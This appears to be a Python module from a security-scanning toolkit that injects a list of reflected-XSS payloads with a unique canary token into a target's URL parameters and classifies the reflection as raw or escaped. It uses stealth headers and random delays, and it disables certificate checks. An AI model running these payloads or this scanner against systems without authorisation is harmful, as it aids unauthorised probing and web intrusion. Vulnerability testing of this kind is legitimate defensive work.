# modules/xss_scanner.py — canary token unik + konteks raw/attr/js + escaping analysis
MODULE_NAME = "xss_scanner"

import asyncio
import html
import random
import re
import string
import time
from typing import Dict, Any, List
from stealth_servant import get_stealth_headers, random_delay, build_session

__all__ = ["MODULE_NAME", "scan"]

def _generate_canary() -> str:
    """Generate unique canary token."""
    rand = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    return f"XSS_CANARY_{rand}_END"


XSS_PAYLOADS = {
    "raw": [
        "<script>alert('{canary}')</script>",
        "<img src=x onerror=alert('{canary}')>",
        "<svg onload=alert('{canary}')>",
        "<body onload=alert('{canary}')>",
        "<iframe src=javascript:alert('{canary}')>",
        "<input autofocus onfocus=alert('{canary}')>",
        "<select autofocus onfocus=alert('{canary}')>",
        "<textarea autofocus onfocus=alert('{canary}')>",
        "<keygen autofocus onfocus=alert('{canary}')>",
        "<video><source onerror=alert('{canary}')>",
        "<audio><source onerror=alert('{canary}')>",
        "<details open ontoggle=alert('{canary}')>",
        "<marquee onstart=alert('{canary}')>",
    ],
    "attr": [
        "\" onmouseover=alert('{canary}') \"",
        "' onmouseover=alert('{canary}') '",
        "\" autofocus onfocus=alert('{canary}') \"",
        "' autofocus onfocus=alert('{canary}') '",
        "javascript:alert('{canary}')",
        "data:text/html,<script>alert('{canary}')</script>",
        "vbscript:msgbox('{canary}')",
        "\" style=animation-name:x onanimationstart=alert('{canary}') \"",
    ],
    "js": [
        "';alert('{canary}');//",
        "\";alert('{canary}');//",
        "`;alert('{canary}');//",
        "'-alert('{canary}')-'",
        "\"-alert('{canary}')-\"",
        "+alert('{canary}')+",
        ",alert('{canary}'),",
        ";alert('{canary}');",
    ]
}


def _analyze_escaping(body: str, canary: str) -> List[Dict[str, Any]]:
    """Analisis escaping pada response body."""
    results = []
    escaped_canary = html.escape(canary)
    double_escaped = html.escape(escaped_canary)

    contexts = [
        ("raw", canary),
        ("html_escaped", escaped_canary),
        ("double_escaped", double_escaped),
    ]

    for ctx_name, token in contexts:
        if token in body:
            idx = body.index(token)
            context = body[max(0, idx-50):idx+len(token)+50]
            results.append({
                "context": ctx_name,
                "found": True,
                "token": token[:50],
                "surrounding": context
            })
        else:
            results.append({"context": ctx_name, "found": False})

    return results


async def _test_payload(url: str, param: Dict, payload: str, session) -> Dict[str, Any]:
    """Test satu XSS payload."""
    test_value = param["value"] + payload
    test_url = url.replace(param["full"], f"{param['name']}={test_value}")

    headers = get_stealth_headers()
    try:
        await random_delay(0.2)
        async with session.get(test_url, headers=headers, timeout=15, allow_redirects=True) as resp:
            body = await resp.text(errors="ignore")
            return {"url": test_url, "status": resp.status, "body": body, "payload": payload}
    except Exception as e:
        return {"url": test_url, "error": str(e), "payload": payload}


async def scan(target: str, config: Dict[str, Any]) -> Dict[str, Any]:
    """XSS scanner: canary token unik + konteks raw/attr/js + escaping analysis."""
    start = time.time()
    base_url = target if target.startswith("http") else f"https://{target}"

    if "?" not in base_url:
        base_url += "?q=test"

    params = []
    if "?" in base_url:
        query = base_url.split("?", 1)[1]
        for pair in query.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                params.append({"name": k, "value": v, "full": pair})

    if not params:
        params = [{"name": "q", "value": "test", "full": "q=test"}]

    canary = _generate_canary()
    findings = []

    async with build_session(verify=False, timeout=20) as session:
        for param in params[:3]:
            for context, payloads in XSS_PAYLOADS.items():
                for payload_template in payloads:
                    payload = payload_template.format(canary=canary)
                    result = await _test_payload(base_url, param, payload, session)
                    if "error" in result:
                        continue

                    escaping = _analyze_escaping(result["body"], canary)
                    raw_found = any(e["found"] and e["context"] == "raw" for e in escaping)
                    html_escaped = any(e["found"] and e["context"] == "html_escaped" for e in escaping)
                    double_escaped = any(e["found"] and e["context"] == "double_escaped" for e in escaping)

                    if raw_found:
                        findings.append({
                            "parameter": param["name"],
                            "context": context,
                            "payload": payload[:100],
                            "escaping": "none",
                            "evidence": "Canary ditemukan tanpa escaping",
                            "severity": "high"
                        })
                    elif html_escaped and not double_escaped:
                        findings.append({
                            "parameter": param["name"],
                            "context": context,
                            "payload": payload[:100],
                            "escaping": "html_single",
                            "evidence": "Canary ter-escape sekali (htmlspecialchars)",
                            "severity": "info"
                        })
                    elif double_escaped:
                        findings.append({
                            "parameter": param["name"],
                            "context": context,
                            "payload": payload[:100],
                            "escaping": "double",
                            "evidence": "Canary double-escaped",
                            "severity": "info"
                        })

    duration = time.time() - start
    return {
        "module": MODULE_NAME,
        "target": target,
        "findings": findings,
        "summary": f"{len([f for f in findings if f['severity'] == 'high'])} potential XSS (raw reflection) dari {len(params)} parameter x {sum(len(v) for v in XSS_PAYLOADS.values())} payloads",
        "severity": "high" if any(f["severity"] == "high" for f in findings) else "info",
        "duration": round(duration, 2),
        "canary": canary,
        "tested_params": len(params),
        "total_payloads": sum(len(v) for v in XSS_PAYLOADS.values())
    }


if __name__ == "__main__":
    import sys
    import json
    t = sys.argv[1] if len(sys.argv) > 1 else "https://testphp.vulnweb.com/search.php?query=test"
    print(json.dumps(asyncio.run(scan(t, {})), indent=2, ensure_ascii=False))